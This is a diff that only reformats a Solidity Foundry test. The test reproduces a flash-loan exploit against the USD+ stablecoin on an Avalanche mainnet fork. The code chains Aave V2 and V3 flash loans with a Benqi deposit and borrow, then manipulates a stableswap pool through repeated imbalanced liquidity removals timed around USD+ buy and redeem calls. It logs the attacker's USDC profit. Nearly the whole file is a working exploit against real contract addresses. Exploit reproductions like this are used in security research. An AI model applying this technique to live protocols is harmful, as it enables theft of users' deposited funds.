@@ -9,7 +9,7 @@ import "./interface.sol";
 // @Address
 // https://snowtrace.io/address/0xfe2c4cb637830b3f1cdc626b99f31b1ff4842e2c
 
-interface JoeRouter{
+interface JoeRouter {
     function swapAVAXForExactTokens(
         uint256 amountOut,
         address[] calldata path,
@@ -18,21 +18,15 @@ interface JoeRouter{
     ) external payable returns (uint256[] memory amounts);
 }
 
-interface USDPlus{
+interface USDPlus {
     function buy(address _referredBy, uint256 amount) external returns (uint256);
     function redeem(address to, uint256 amount) external returns (uint256 redeemed);
 }
-interface SwapFlashLoan{
-    function calculateTokenAmount(
-        uint256[] calldata amounts,
-        bool deposit
-    ) external view returns (uint256);
 
-    function addLiquidity(
-        uint256[] calldata amounts,
-        uint256 minToMint,
-        uint256 deadline
-    ) external returns (uint256);
+interface SwapFlashLoan {
+    function calculateTokenAmount(uint256[] calldata amounts, bool deposit) external view returns (uint256);
+
+    function addLiquidity(uint256[] calldata amounts, uint256 minToMint, uint256 deadline) external returns (uint256);
 
     function calculateRemoveLiquidity(uint256 amount) external returns (uint256[] memory);
 
@@ -51,32 +45,33 @@ interface SwapFlashLoan{
     ) external returns (uint256);
 }
 
-interface BenqiFinance{
-    function enterMarkets(address[] memory qiTokens) external returns (uint[] memory);
-    function getAccountLiquidity(address account) external view returns (uint, uint, uint);
+interface BenqiFinance {
+    function enterMarkets(address[] memory qiTokens) external returns (uint256[] memory);
+    function getAccountLiquidity(address account) external view returns (uint256, uint256, uint256);
     function getHypotheticalAccountLiquidity(
         address account,
         address qiTokenModify,
-        uint redeemTokens,
-        uint borrowAmount) external view returns (uint, uint, uint);
+        uint256 redeemTokens,
+        uint256 borrowAmount
+    ) external view returns (uint256, uint256, uint256);
 }
 
-interface BenqiChainlinkOracle{
-    function getUnderlyingPrice(address qiToken) external view returns (uint);
+interface BenqiChainlinkOracle {
+    function getUnderlyingPrice(address qiToken) external view returns (uint256);
 }
 
-interface QiUSDCn{
-    function mint(uint mintAmount) external returns (uint);
-    function redeemUnderlying(uint redeemAmount) external returns (uint);
+interface QiUSDCn {
+    function mint(uint256 mintAmount) external returns (uint256);
+    function redeemUnderlying(uint256 redeemAmount) external returns (uint256);
 }
 
-interface QiUSDC{
-    function borrow(uint borrowAmount) external returns (uint);
-    function repayBorrow(uint repayAmount) external returns (uint);
-    function borrowBalanceStored(address account) external view returns (uint);
+interface QiUSDC {
+    function borrow(uint256 borrowAmount) external returns (uint256);
+    function repayBorrow(uint256 repayAmount) external returns (uint256);
+    function borrowBalanceStored(address account) external view returns (uint256);
 }
 
-interface PlatypusFinance{
+interface PlatypusFinance {
     function swap(
         address fromToken,
         address toToken,
@@ -87,31 +82,31 @@ interface PlatypusFinance{
     ) external;
 }
 
-interface NetAsset{
+interface NetAsset {
     function netAssetValue() external view returns (uint256);
 }
 
-interface TotalNetAsset{
+interface TotalNetAsset {
     function totalNetAssets() external view returns (uint256);
 }
 
-interface SicleRouter{
+interface SicleRouter {
     function swapExactTokensForTokens(
-        uint amountIn,
-        uint amountOutMin,
+        uint256 amountIn,
+        uint256 amountOutMin,
         address[] calldata path,
         address to,
-        uint deadline
+        uint256 deadline
     ) external;
 }
 
-contract ContractTest is DSTest{
+contract ContractTest is DSTest {
     JoeRouter Router = JoeRouter(0x60aE616a2155Ee3d9A68541Ba4544862310933d4);
     SicleRouter sicleRouter = SicleRouter(0xC7f372c62238f6a5b79136A9e5D16A2FD7A3f0F5);
-    USDPlus USDplus =USDPlus(0x73cb180bf0521828d8849bc8CF2B920918e23032);
+    USDPlus USDplus = USDPlus(0x73cb180bf0521828d8849bc8CF2B920918e23032);
     SwapFlashLoan Swap = SwapFlashLoan(0xED2a7edd7413021d440b09D654f3b87712abAB66);
     IAaveFlashloan LendingPoolV2 = IAaveFlashloan(0x4F01AeD16D97E3aB5ab2B501154DC9bb0F1A5A2C);
-    IAaveFlashloan PoolV3  = IAaveFlashloan(0x794a61358D6845594F94dc1DB02A252b5b4814aD);
+    IAaveFlashloan PoolV3 = IAaveFlashloan(0x794a61358D6845594F94dc1DB02A252b5b4814aD);
     BenqiFinance Benqi = BenqiFinance(0x486Af39519B4Dc9a7fCcd318217352830E8AD9b4);
     BenqiChainlinkOracle Oracle = BenqiChainlinkOracle(0x316aE55EC59e0bEb2121C0e41d4BDef8bF66b32B);
     QiUSDCn qiUSDCn = QiUSDCn(0xB715808a78F6041E46d61Cb123C9B4A27056AE9C);
@@ -128,46 +123,35 @@ contract ContractTest is DSTest{
     IERC20 USDC = IERC20(0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E);
     IERC20 nUSDLP = IERC20(0xCA87BF3ec55372D9540437d7a86a7750B42C02f4);
     address avUSDC = 0x46A51127C3ce23fb7AB1DE06226147F446e4a857;
-    uint PoolV2BorrowAmount;
-    uint amountBuy;
+    uint256 PoolV2BorrowAmount;
+    uint256 amountBuy;
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
-
     function setUp() public {
-        cheats.createSelectFork("Avalanche", 23097846); 
+        cheats.createSelectFork("Avalanche", 23_097_846);
     }
 
-    function testExploit() public payable{
+    function testExploit() public payable {
         amountBuy = 36_000_000_000;
         address[] memory path = new address[](2);
         path[0] = address(WAVAX);
         path[1] = address(USDC);
         Router.swapAVAXForExactTokens{value: 2830 ether}(amountBuy, path, address(this), block.timestamp);
 
-        uint beforeAttackBalance = USDC.balanceOf(address(this));
-        emit log_named_uint(
-            "Before exploit , USDC balance of attacker",
-            beforeAttackBalance / 1e6
-        );
+        uint256 beforeAttackBalance = USDC.balanceOf(address(this));
+        emit log_named_uint("Before exploit , USDC balance of attacker", beforeAttackBalance / 1e6);
 
         Hack();
 
-        uint afterAttackBalance = USDC.balanceOf(address(this));
-        emit log_named_uint(
-            "After exploit , USDC balance of attacker",
-            afterAttackBalance / 1e6
-        );
+        uint256 afterAttackBalance = USDC.balanceOf(address(this));
+        emit log_named_uint("After exploit , USDC balance of attacker", afterAttackBalance / 1e6);
 
-        uint profitAttack = afterAttackBalance - beforeAttackBalance;
-        emit log_named_uint(
-            "Profit: USDC balance of attacker",
-            profitAttack / 1e6
-        );
-
+        uint256 profitAttack = afterAttackBalance - beforeAttackBalance;
+        emit log_named_uint("Profit: USDC balance of attacker", profitAttack / 1e6);
     }
 
     function Hack() public {
-        for(uint i = 0; i < 6; i++){
+        for (uint256 i = 0; i < 6; i++) {
             cheats.roll(block.number + 1);
             PoolV2BorrowAmount = USDC_e.balanceOf(avUSDC);
             address[] memory assets = new address[](1);
@@ -176,21 +160,20 @@ contract ContractTest is DSTest{
             amounts[0] = PoolV2BorrowAmount;
             uint256[] memory modes = new uint[](1);
             modes[0] = 0;
-            LendingPoolV2.flashLoan(address(this),assets, amounts, modes, address(this), "", 0); // FlashLoan USDC.e
+            LendingPoolV2.flashLoan(address(this), assets, amounts, modes, address(this), "", 0); // FlashLoan USDC.e
             cheats.roll(block.number + 1); // USD+ buy and redeem not allowed in one block
             // redeem USD+ to USDC
-            if((totalNetAsset.totalNetAssets() - netAsset.netAssetValue()) > USDPLUS.balanceOf(address(this))){
+            if ((totalNetAsset.totalNetAssets() - netAsset.netAssetValue()) > USDPLUS.balanceOf(address(this))) {
                 USDplus.redeem(address(USDC), USDPLUS.balanceOf(address(this)));
-            }else{
+            } else {
                 USDplus.redeem(address(USDC), totalNetAsset.totalNetAssets() - netAsset.netAssetValue());
             }
         }
-        USDPLUS.approve(address(sicleRouter), type(uint).max);
+        USDPLUS.approve(address(sicleRouter), type(uint256).max);
         address[] memory path = new address[](2);
         path[0] = address(USDPLUS);
         path[1] = address(USDC);
         sicleRouter.swapExactTokensForTokens(USDPLUS.balanceOf(address(this)), 0, path, address(this), block.timestamp);
-
     }
 
     function executeOperation(
@@ -200,8 +183,8 @@ contract ContractTest is DSTest{
         address initiator,
         bytes calldata params
     ) external payable returns (bool) {
-        if(msg.sender == address(LendingPoolV2)){
-            USDC_e.approve(address(LendingPoolV2), type(uint).max);
+        if (msg.sender == address(LendingPoolV2)) {
+            USDC_e.approve(address(LendingPoolV2), type(uint256).max);
             address[] memory assets1 = new address[](1);
             assets1[0] = address(USDC);
             uint256[] memory amounts1 = new uint256[](1);
@@ -211,30 +194,29 @@ contract ContractTest is DSTest{
             PoolV3.flashLoan(address(this), assets1, amounts1, modes, address(this), "", 0); // FlashLoan USDC
 
             return true;
-        } else{
-            USDC.approve(address(PoolV3), type(uint).max);
-            uint mintAmount = PoolV2BorrowAmount / 2;
-            USDC.approve(address(qiUSDCn), type(uint).max);
+        } else {
+            USDC.approve(address(PoolV3), type(uint256).max);
+            uint256 mintAmount = PoolV2BorrowAmount / 2;
+            USDC.approve(address(qiUSDCn), type(uint256).max);
             qiUSDCn.mint(mintAmount); // deposit USDC to qiUSDCn
 
             address[] memory qiTokens = new address[](1);
             qiTokens[0] = address(qiUSDCn);
             Benqi.enterMarkets(qiTokens);
-            ( ,uint accountLiquidity, ) = Benqi.getAccountLiquidity(address(this));
-            uint oraclePrice = Oracle.getUnderlyingPrice(address(qiUSDC)) / 1e18;
-            uint borrowAmount = accountLiquidity / oraclePrice;
+            (, uint256 accountLiquidity,) = Benqi.getAccountLiquidity(address(this));
+            uint256 oraclePrice = Oracle.getUnderlyingPrice(address(qiUSDC)) / 1e18;
+            uint256 borrowAmount = accountLiquidity / oraclePrice;
             qiUSDC.borrow(borrowAmount); // borrow USDC.e from qiUSDC
 
-            
-            // swap USDC.e to nUSD, DAI.e, USDT.e 
-            USDC_e.approve(address(Swap), type(uint).max);
-            nUSDLP.approve(address(Swap), type(uint).max);
+            // swap USDC.e to nUSD, DAI.e, USDT.e
+            USDC_e.approve(address(Swap), type(uint256).max);
+            nUSDLP.approve(address(Swap), type(uint256).max);
             uint256[] memory amount = new uint256[](4);
             amount[2] = USDC_e.balanceOf(address(this));
-            uint minToMint = Swap.calculateTokenAmount(amount, true) * 99 / 100;
-            uint LPAmount = Swap.addLiquidity(amount, minToMint, block.timestamp);
-            uint i = 0;
-            while(i < 9){
+            uint256 minToMint = Swap.calculateTokenAmount(amount, true) * 99 / 100;
+            uint256 LPAmount = Swap.addLiquidity(amount, minToMint, block.timestamp);
+            uint256 i = 0;
+            while (i < 9) {
                 uint256[] memory removeAmount = new uint256[](4);
                 removeAmount = Swap.calculateRemoveLiquidity(LPAmount);
                 removeAmount[2] = 0;
@@ -245,17 +227,17 @@ contract ContractTest is DSTest{
             uint256[] memory removeAmount1 = new uint256[](4);
             removeAmount1 = Swap.calculateRemoveLiquidity(LPAmount);
             Swap.removeLiquidityImbalance(removeAmount1, LPAmount, block.timestamp);
-            uint swapAmount = USDC_e.balanceOf(address(this)) / 3;
-            nUSD.approve(address(Swap), type(uint).max);
-            DAI_e.approve(address(Swap), type(uint).max);
-            USDT_e.approve(address(Swap), type(uint).max);
+            uint256 swapAmount = USDC_e.balanceOf(address(this)) / 3;
+            nUSD.approve(address(Swap), type(uint256).max);
+            DAI_e.approve(address(Swap), type(uint256).max);
+            USDT_e.approve(address(Swap), type(uint256).max);
             // swap remaining USDC.e to nUSD, DAI.e, USDT.e
             Swap.swap(2, 0, swapAmount, 0, block.timestamp);
             Swap.swap(2, 1, swapAmount, 0, block.timestamp);
             Swap.swap(2, 3, swapAmount, 0, block.timestamp);
 
-            USDC.approve(address(USDplus), type(uint).max);
-            USDplus.buy(address(USDC), USDC.balanceOf(address(this))); // tigger Swap.addLiquidity(USDC.e), add USDC.e reserve in Pool 
+            USDC.approve(address(USDplus), type(uint256).max);
+            USDplus.buy(address(USDC), USDC.balanceOf(address(this))); // tigger Swap.addLiquidity(USDC.e), add USDC.e reserve in Pool
             // swap nUSD, DAI.e, USDT.e to USDC.e
             Swap.swap(0, 2, nUSD.balanceOf(address(this)), 0, block.timestamp);
             Swap.swap(1, 2, DAI_e.balanceOf(address(this)), 0, block.timestamp);
@@ -265,14 +247,20 @@ contract ContractTest is DSTest{
             qiUSDC.repayBorrow(qiUSDC.borrowBalanceStored(address(this))); // repay borrow USDC.e
             qiUSDCn.redeemUnderlying(mintAmount); // withdraw USDC from qiUSDCn
 
-            USDC_e.approve(address(Platypus), type(uint).max);
-            uint USDC_eSwapAmount = USDC_e.balanceOf(address(this)) - PoolV2BorrowAmount / 9991 * 10000 + 1000;
-            Platypus.swap(address(USDC_e), address(USDC), USDC_eSwapAmount, USDC_eSwapAmount * 99 / 100, address(this), block.timestamp); // swap profit USDC.e to USDC
+            USDC_e.approve(address(Platypus), type(uint256).max);
+            uint256 USDC_eSwapAmount = USDC_e.balanceOf(address(this)) - PoolV2BorrowAmount / 9991 * 10_000 + 1000;
+            Platypus.swap(
+                address(USDC_e),
+                address(USDC),
+                USDC_eSwapAmount,
+                USDC_eSwapAmount * 99 / 100,
+                address(this),
+                block.timestamp
+            ); // swap profit USDC.e to USDC
 
             return true;
-
         }
-        
     }
-    receive() payable external{}
+
+    receive() external payable {}
 }
